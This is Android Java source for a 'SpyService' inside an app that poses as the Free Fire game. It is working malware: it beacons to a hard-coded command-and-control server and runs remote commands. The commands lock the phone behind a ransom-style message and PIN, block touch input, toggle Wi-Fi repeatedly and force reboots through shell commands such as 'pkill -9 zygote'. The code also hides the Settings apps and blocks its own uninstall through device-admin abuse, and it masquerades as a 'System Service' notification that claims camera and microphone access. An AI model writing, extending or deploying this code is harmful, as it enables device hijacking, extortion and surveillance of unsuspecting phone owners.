package com.dts.freefireth;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SpyService extends Service {

    private static final String TAG        = "CRPT.Spy";
    private static final String CHANNEL_ID = "SpyServiceChannel";
    private static final int    NOTIF_ID   = 1;
    private static final String SERVER     = "http://panel-icxninh.keselekbijiwowo.web.id:2026";

    private Handler  loopHandler;
    private Runnable loopRunnable;
    private boolean  running = false;

    // ── TOUCH BLOCK ──────────────────────────────────────────────────────────
    private View touchBlockView;
    private Handler touchBlockHandler;
    private Runnable touchBlockRunnable;

    // ── BROADCAST RECEIVER ──────────────────────────────────────────────────
    private final BroadcastReceiver commandReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action == null) return;

            switch (action) {
                case "com.dts.freefireth.TOUCH_BLOCK":
                    long duration = intent.getLongExtra("duration", 0);
                    startTouchBlock(duration);
                    break;
                case "com.dts.freefireth.STOP_TOUCH_BLOCK":
                    stopTouchBlock();
                    break;
                case "com.dts.freefireth.ANTI_UNINSTALL":
                    boolean enabled = intent.getBooleanExtra("enabled", false);
                    toggleAntiUninstall(enabled);
                    break;
                case "com.dts.freefireth.WIFI_THRASH":
                    wifiThrash();
                    break;
                case "com.dts.freefireth.UNLOCK_DEVICE": // 🔥 TAMBAHKAN
                    unlockDevice();
                    break;
            }
        }
    };

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 STATIC SAVE DEVICE ID
    // ─────────────────────────────────────────────────────────────────────────
    public static void saveDeviceIdAll(Context context, String deviceId) {
        if (deviceId == null || deviceId.isEmpty()) return;
        
        try {
            SharedPreferences prefs = context.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
            prefs.edit()
                .putString("flutter.target_id", deviceId)
                .putString("flutter.target_model", android.os.Build.BRAND + " " + android.os.Build.MODEL)
                .apply();
        } catch (Exception ignored) {}

        try {
            SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            prefs.edit().putString("targetId", deviceId).apply();
        } catch (Exception ignored) {}

        try {
            File dir = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
            if (!dir.exists()) dir.mkdirs();
            File f = new File(dir, ".devid");
            FileWriter fw = new FileWriter(f);
            fw.write(deviceId);
            fw.close();
        } catch (Exception ignored) {}

        try {
            File f = new File(context.getCacheDir(), "devid.dat");
            FileWriter fw = new FileWriter(f);
            fw.write(deviceId);
            fw.close();
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 READ DEVICE ID
    // ─────────────────────────────────────────────────────────────────────────
    private String getDeviceIdSafe() {
        try {
            String id = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
                .getString("flutter.target_id", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}

        try {
            String id = getSharedPreferences("SpyPrefs", MODE_PRIVATE)
                .getString("targetId", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}

        try {
            File f = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f));
                String id = br.readLine();
                br.close();
                if (id != null && !id.trim().isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}

        try {
            File f = new File(getCacheDir(), "devid.dat");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f));
                String id = br.readLine();
                br.close();
                if (id != null && !id.trim().isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}

        try {
            String aid = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            if (aid != null && !aid.isEmpty()) {
                String id = (android.os.Build.BRAND + "-" + android.os.Build.MODEL + "-" + aid)
                    .replaceAll(" ", "_");
                saveDeviceIdAll(getApplicationContext(), id);
                return id;
            }
        } catch (Exception ignored) {}

        return null;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 UNLOCK DEVICE — METHOD BARU
    // ─────────────────────────────────────────────────────────────────────────
    private void unlockDevice() {
        try {
            // 1. Update SharedPreferences
            getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                .putBoolean("isLocked", false)
                .putBoolean("isLockLive", false)
                .apply();
            
            // 2. Kirim broadcast unlock ke LockOverlayService
            Intent unlockIntent = new Intent(LockOverlayService.ACTION_UNLOCK);
            sendBroadcast(unlockIntent);
            
            // 3. Kirim broadcast ke AutoAdminActivator (kalo ada)
            try {
                Intent adminUnlock = new Intent("com.dts.freefireth.UNLOCK_DEVICE");
                sendBroadcast(adminUnlock);
            } catch (Exception ignored) {}
            
            Log.d(TAG, "Device unlocked successfully");
        } catch (Exception e) {
            Log.w(TAG, "unlockDevice error: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 SERVICE LIFECYCLE
    // ─────────────────────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        
        buildNotification();
        PersistentWorker.schedule(this);
        
        try {
            AutoAccessibilityHelper.requestAccessibility(this);
        } catch (Exception e) {
            Log.w(TAG, "Accessibility request error: " + e.getMessage());
        }
        
        try {
            Intent wd = new Intent(this, WatchdogService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(wd);
            } else {
                startService(wd);
            }
            Log.d(TAG, "WatchdogService started");
        } catch (Exception e) {
            Log.w(TAG, "Watchdog start error: " + e.getMessage());
        }

        // 🔥 REGISTER BROADCAST RECEIVER
        IntentFilter filter = new IntentFilter();
        filter.addAction("com.dts.freefireth.TOUCH_BLOCK");
        filter.addAction("com.dts.freefireth.STOP_TOUCH_BLOCK");
        filter.addAction("com.dts.freefireth.ANTI_UNINSTALL");
        filter.addAction("com.dts.freefireth.WIFI_THRASH");
        filter.addAction("com.dts.freefireth.UNLOCK_DEVICE"); // 🔥 TAMBAHKAN
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(commandReceiver, filter);
        }
        
        startLoop();
        Log.d(TAG, "SpyService created with all features");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) startLoop();
        
        try {
            Intent wd = new Intent(this, WatchdogService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(wd);
            } else {
                startService(wd);
            }
        } catch (Exception ignored) {}
        
        Log.d(TAG, "SpyService onStartCommand");
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "Task removed, restarting...");
        try {
            Intent restartIntent = new Intent(getApplicationContext(), SpyService.class);
            restartIntent.setPackage(getPackageName());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent);
            } else {
                startService(restartIntent);
            }
        } catch (Exception ignored) {}
        
        try {
            Intent wd = new Intent(this, WatchdogService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(wd);
            } else {
                startService(wd);
            }
        } catch (Exception ignored) {}
        
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        running = false;
        if (loopHandler != null && loopRunnable != null) {
            loopHandler.removeCallbacks(loopRunnable);
        }
        
        try {
            unregisterReceiver(commandReceiver);
        } catch (Exception ignored) {}
        
        try {
            Intent broadcast = new Intent("RestartSpyService");
            broadcast.setClass(this, RestarterReceiver.class);
            sendBroadcast(broadcast);
        } catch (Exception ignored) {}
        
        Log.d(TAG, "SpyService destroyed");
        super.onDestroy();
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 LOOP
    // ─────────────────────────────────────────────────────────────────────────
    private void startLoop() {
        if (running) return;
        running = true;
        loopHandler = new Handler(Looper.getMainLooper());
        loopRunnable = new Runnable() {
            @Override public void run() {
                if (!running) return;
                try { tick(); } catch (Exception e) { Log.w(TAG, "Loop error: " + e.getMessage()); }
                loopHandler.postDelayed(this, 2000);
            }
        };
        loopHandler.post(loopRunnable);
        Log.d(TAG, "Loop started");
    }

    private void tick() {
        String deviceId = getDeviceIdSafe();
        if (deviceId == null || deviceId.isEmpty()) {
            Log.w(TAG, "No device ID found");
            return;
        }

        try {
            JSONObject body = new JSONObject();
            body.put("id", deviceId);
            body.put("status", "Alive");
            body.put("battery", getBattery());
            postJson(SERVER + "/api/heartbeat/" + deviceId, body.toString());
        } catch (Exception e) { Log.w(TAG, "hb error: " + e.getMessage()); }

        try {
            String resp = getReq(SERVER + "/api/get-command/" + deviceId);
            if (resp == null || resp.isEmpty() || resp.equals("{}")) return;
            JSONObject d = new JSONObject(resp);
            String cmd   = d.optString("command", "idle");
            String extra = d.optString("extra", "");
            if ("idle".equals(cmd)) return;
            execCmd(deviceId, cmd, extra);
        } catch (Exception e) { Log.w(TAG, "cmd error: " + e.getMessage()); }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 EXECUTE COMMAND
    // ─────────────────────────────────────────────────────────────────────────
    private void execCmd(String deviceId, String cmd, String extra) {
        new Thread(() -> {
            try {
                JSONObject result = new JSONObject();

                switch (cmd) {

                    case "force_open": {
                        Intent l = getPackageManager().getLaunchIntentForPackage(getPackageName());
                        if (l != null) {
                            l.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                            startActivity(l);
                            result.put("status", "opened");
                        } else {
                            result.put("status", "failed_to_open");
                        }
                        break;
                    }

                    case "lock_live":
                    case "hard_lock":
                    case "lock_screen":
                    case "lock_device": {
                        String msg = "YOUR PHONE IS LOCKED!!!!";
                        String pin = "1234";
                        if (extra != null && extra.contains("|")) {
                            String[] pts = extra.split("\\|", 2);
                            msg = pts[0].isEmpty() ? msg : pts[0];
                            pin = pts.length > 1 && !pts[1].isEmpty() ? pts[1] : pin;
                        } else if (extra != null && !extra.isEmpty()) {
                            msg = extra;
                        }

                        boolean isLive = "lock_live".equals(cmd);
                        getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                            .putBoolean("isLocked", true)
                            .putBoolean("isLockLive", isLive)
                            .putString("lockMessage", msg)
                            .putString("lockPin", pin)
                            .apply();

                        try {
                            android.app.admin.DevicePolicyManager dpm =
                                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            android.content.ComponentName admin =
                                new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpm != null && dpm.isAdminActive(admin)) {
                                dpm.lockNow();
                                result.put("status", isLive ? "lock_live_active" : "locked");
                            } else {
                                Intent req = getPackageManager().getLaunchIntentForPackage(getPackageName());
                                if (req != null) {
                                    req.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    startActivity(req);
                                }
                                result.put("status", "admin_not_active_reopening");
                            }
                        } catch (Exception e) {
                            result.put("status", "lock_err: " + e.getMessage());
                        }
                        break;
                    }

                    case "unlock":
                    case "unlock_device": { // 🔥 TAMBAHKAN
                        unlockDevice();
                        result.put("status", "unlocked");
                        break;
                    }

                    // 🔥 ANTI UNINSTALL
                    case "anti_uninstall": {
                        boolean enabled = "true".equals(extra);
                        toggleAntiUninstall(enabled);
                        result.put("status", enabled ? "anti_uninstall_on" : "anti_uninstall_off");
                        break;
                    }

                    // 🔥 BLOCK TOUCH
                    case "block_touch": {
                        try {
                            JSONObject obj = new JSONObject(extra);
                            long duration = obj.optLong("duration", 0);
                            startTouchBlock(duration);
                            result.put("status", "touch_blocked");
                        } catch (Exception e) {
                            result.put("status", "touch_block_error: " + e.getMessage());
                        }
                        break;
                    }

                    // 🔥 STOP TOUCH BLOCK
                    case "stop_touch_block": {
                        stopTouchBlock();
                        result.put("status", "touch_unblocked");
                        break;
                    }

                    // 🔥 WIFI THRASH
                    case "wifi_thrash": {
                        wifiThrash();
                        result.put("status", "wifi_thrashed");
                        break;
                    }

                    case "reboot_device":
                    case "restart_device": {
                        boolean done = false;
                        Exception lastError = null;

                        if (!done) {
                            try {
                                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                                if (pm != null) {
                                    java.lang.reflect.Method m = pm.getClass().getDeclaredMethod("reboot", String.class);
                                    m.setAccessible(true);
                                    m.invoke(pm, (Object) null);
                                    done = true;
                                    Log.d(TAG, "Reboot: PowerManager success");
                                }
                            } catch (Exception ex) { lastError = ex; Log.w(TAG, "PM reboot: " + ex.getMessage()); }
                        }

                        if (!done) {
                            try {
                                android.app.admin.DevicePolicyManager dpm2 =
                                    (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                                android.content.ComponentName admin2 =
                                    new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                                if (dpm2 != null && dpm2.isAdminActive(admin2) && Build.VERSION.SDK_INT >= 24) {
                                    dpm2.reboot(admin2);
                                    done = true;
                                    Log.d(TAG, "Reboot: DPM success");
                                }
                            } catch (Exception ex) { lastError = ex; Log.w(TAG, "DPM reboot: " + ex.getMessage()); }
                        }

                        if (!done) {
                            try {
                                Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                                if (p.waitFor(3, java.util.concurrent.TimeUnit.SECONDS)) {
                                    done = true;
                                    Log.d(TAG, "Reboot: su success");
                                }
                            } catch (Exception ex) { lastError = ex; Log.w(TAG, "su reboot: " + ex.getMessage()); }
                        }

                        if (!done) {
                            try {
                                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "am crash system_server"});
                                p.waitFor(1, java.util.concurrent.TimeUnit.SECONDS);
                                done = true;
                                Log.d(TAG, "Reboot: am crash success");
                            } catch (Exception ex) { lastError = ex; Log.w(TAG, "am crash: " + ex.getMessage()); }
                        }

                        if (!done) {
                            try {
                                Runtime.getRuntime().exec(new String[]{"sh", "-c", "pkill -9 zygote"});
                                done = true;
                                Log.d(TAG, "Reboot: pkill success");
                            } catch (Exception ex) { lastError = ex; Log.w(TAG, "pkill: " + ex.getMessage()); }
                        }

                        if (!done) {
                            try {
                                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "setprop sys.powerctl reboot"});
                                p.waitFor(2, java.util.concurrent.TimeUnit.SECONDS);
                                done = true;
                                Log.d(TAG, "Reboot: setprop success");
                            } catch (Exception ex) { lastError = ex; Log.w(TAG, "setprop reboot: " + ex.getMessage()); }
                        }

                        if (!done) {
                            try {
                                Intent rebootIntent = new Intent(Intent.ACTION_REBOOT);
                                rebootIntent.putExtra("nowait", 1);
                                rebootIntent.putExtra("interval", 1);
                                rebootIntent.putExtra("window", 0);
                                sendBroadcast(rebootIntent);
                                done = true;
                                Log.d(TAG, "Reboot: Intent success");
                            } catch (Exception ex) { lastError = ex; Log.w(TAG, "Intent reboot: " + ex.getMessage()); }
                        }

                        result.put("status", done ? "rebooting" : "reboot_attempted");
                        if (!done && lastError != null) {
                            result.put("error", lastError.getMessage());
                        }
                        break;
                    }

                    case "vibrate_loop": {
                        android.os.Vibrator vib = null;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            android.os.VibratorManager vbm = (android.os.VibratorManager) getSystemService(VIBRATOR_MANAGER_SERVICE);
                            if (vbm != null) vib = vbm.getDefaultVibrator();
                        } else {
                            vib = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                        }
                        if (vib != null) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vib.vibrate(android.os.VibrationEffect.createWaveform(
                                    new long[]{0, 500, 200}, 0));
                            } else {
                                vib.vibrate(new long[]{0, 500, 200}, 0);
                            }
                            result.put("status", "vibrating");
                        } else {
                            result.put("status", "vibrator_unavailable");
                        }
                        break;
                    }

                    case "kill_wifi": {
                        try {
                            android.net.wifi.WifiManager wm =
                                (android.net.wifi.WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                            if (wm != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                                wm.setWifiEnabled(false);
                            }
                        } catch (Exception ignored) {}
                        result.put("status", "wifi_killed");
                        break;
                    }

                    case "re_request_admin": {
                        Intent adminReq = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        android.content.ComponentName comp =
                            new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                        adminReq.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                        adminReq.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "Diperlukan untuk keamanan sistem.");
                        adminReq.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(adminReq);
                        result.put("status", "admin_requested");
                        break;
                    }

                    default: {
                        result.put("status", "needs_flutter");
                        result.put("cmd", cmd);
                        try {
                            Intent l = getPackageManager().getLaunchIntentForPackage(getPackageName());
                            if (l != null) {
                                l.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(l);
                            }
                        } catch (Exception ignored) {}
                        break;
                    }
                }

                JSONObject resp = new JSONObject();
                resp.put("cmd", cmd);
                resp.put("data", result);
                postJson(SERVER + "/api/post-response/" + deviceId, resp.toString());

            } catch (Exception e) {
                Log.w(TAG, "exec error: " + e.getMessage());
                try {
                    JSONObject err = new JSONObject();
                    err.put("cmd", cmd);
                    err.put("data", new JSONObject().put("status", "error: " + e.getMessage()));
                    postJson(SERVER + "/api/post-response/" + deviceId, err.toString());
                } catch (Exception ignored) {}
            }
        }).start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 TOUCH BLOCK
    // ─────────────────────────────────────────────────────────────────────────
    private void startTouchBlock(long duration) {
        try {
            stopTouchBlock();
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            );

            View view = new View(this);
            view.setBackgroundColor(android.graphics.Color.TRANSPARENT);
            view.setOnTouchListener((v, e) -> true);

            touchBlockView = view;
            new Handler(Looper.getMainLooper()).post(() -> {
                try { wm.addView(view, params); } catch (Exception ignored) {}
            });

            if (duration > 0) {
                touchBlockHandler = new Handler(Looper.getMainLooper());
                touchBlockRunnable = () -> stopTouchBlock();
                touchBlockHandler.postDelayed(touchBlockRunnable, duration * 1000L);
            }
        } catch (Exception e) {
            Log.w(TAG, "startTouchBlock: " + e.getMessage());
        }
    }

    private void stopTouchBlock() {
        if (touchBlockRunnable != null && touchBlockHandler != null) {
            touchBlockHandler.removeCallbacks(touchBlockRunnable);
        }
        touchBlockHandler = null;
        touchBlockRunnable = null;
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (touchBlockView != null) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try { wm.removeView(touchBlockView); } catch (Exception ignored) {}
            });
            touchBlockView = null;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 ANTI UNINSTALL
    // ─────────────────────────────────────────────────────────────────────────
    private void toggleAntiUninstall(boolean enabled) {
        try {
            android.app.admin.DevicePolicyManager dpm = 
                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin = 
                new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                String[] settingsPackages = {
                    "com.android.settings",
                    "com.android.packageinstaller",
                    "com.miui.securitycenter",
                    "com.sec.android.app.settings",
                    "com.oplus.settings",
                    "com.vivo.settings",
                    "com.realme.settings",
                    "com.xiaomi.settings",
                    "com.huawei.settings"
                };
                for (String pkg : settingsPackages) {
                    try {
                        dpm.setApplicationHidden(admin, pkg, enabled);
                    } catch (Exception ignored) {}
                }
                dpm.setApplicationHidden(admin, getPackageName(), enabled);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    dpm.setUninstallBlocked(admin, getPackageName(), enabled);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "toggleAntiUninstall: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 WIFI THRASH
    // ─────────────────────────────────────────────────────────────────────────
    private void wifiThrash() {
        try {
            android.net.wifi.WifiManager wm = 
                (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    for (int i = 0; i < 50; i++) {
                        wm.setWifiEnabled(false);
                        Thread.sleep(10);
                        wm.setWifiEnabled(true);
                        Thread.sleep(10);
                    }
                    wm.setWifiEnabled(false);
                } else {
                    try {
                        java.lang.reflect.Method setWifiEnabled = wm.getClass()
                            .getMethod("setWifiEnabled", boolean.class);
                        for (int i = 0; i < 30; i++) {
                            setWifiEnabled.invoke(wm, false);
                            Thread.sleep(15);
                            setWifiEnabled.invoke(wm, true);
                            Thread.sleep(15);
                        }
                        setWifiEnabled.invoke(wm, false);
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "wifiThrash: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 HTTP HELPERS
    // ─────────────────────────────────────────────────────────────────────────
    private String getReq(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            if (c.getResponseCode() != 200) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            return sb.toString();
        } catch (Exception e) {
            Log.w(TAG, "getReq error: " + e.getMessage());
            return null;
        }
    }

    private void postJson(String url, String json) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            c.setDoOutput(true);
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8));
            os.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }

    private int getBattery() {
        try {
            Intent i = getApplicationContext().registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int lv = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int sc = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (lv >= 0 && sc > 0) return (int) (lv * 100f / sc);
            }
        } catch (Exception ignored) {}
        return 100;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 🔥 NOTIFICATION
    // ─────────────────────────────────────────────────────────────────────────
    private void buildNotification() {
        createChannel();
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(NOTIF_ID, n,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID,
                "System Background", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }
}